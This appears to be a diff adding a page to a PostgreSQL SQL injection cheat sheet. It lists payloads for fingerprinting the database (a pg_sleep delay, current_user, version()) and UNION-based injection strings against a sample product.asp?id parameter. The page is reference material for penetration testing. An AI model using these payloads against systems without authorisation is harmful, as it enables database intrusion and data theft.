@@ -1,0 +1,59 @@
+<h3 id="sql-injection-detection">DBMS Identification</h3>
+
+<p class="pageDescription">{{site.data.injectionDescriptions.dbmsIdentification}}</p>
+<p><i>Note: The comment characters <code>&nbsp;--&nbsp;</code> are placed after the query to remove any commmands following our query, helping to prevent errors.</i></p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Sleep for 10 seconds</td>
+      <td>'||pg_sleep(10)--</td>
+    </tr>
+    <tr>
+      <td>Default variables</td>
+      <td>SELECT current_user -- </td>
+	  <td>SELECT session_user -- </td>
+    </tr>
+    <tr>
+      <td>String concatenation</td>
+      <td>param='postg'||'resql' -- </td>
+    </tr>
+    <tr>
+      <td>Functions</td>
+      <td>version() -- </td>
+	  <td>SUBSTR() -- </td>
+	  <td>SUBSTRING() -- </td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="general-tips">General Tips</h3>
+
+<p>Ending a query with a semicolon may cause an error (e.g. ' and 1=1;-- causes an error but ' and 1=1-- does not)</p>
+
+<h3 id="sql-injection-types">Converting queries to injections</h3>
+
+<p>Now that the injection has been identified, the rest of this guide will contain full queries. Use the methods below to insert those queries into your injection points. <code>SELECT current_user</code> will be the example query.</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Union</td>
+      <td>product.asp?id=' UNION SELECT current_user -- </td>
+    </tr>
+    <tr>
+      <td>Union null<br/><i>Note: If original query returns more than one column, add null to equal the number of columns</i></td>
+      <td>product.asp?id=' UNION SELECT current_user,null -- <br></td>
+    </tr>
+  </tbody>
+</table>
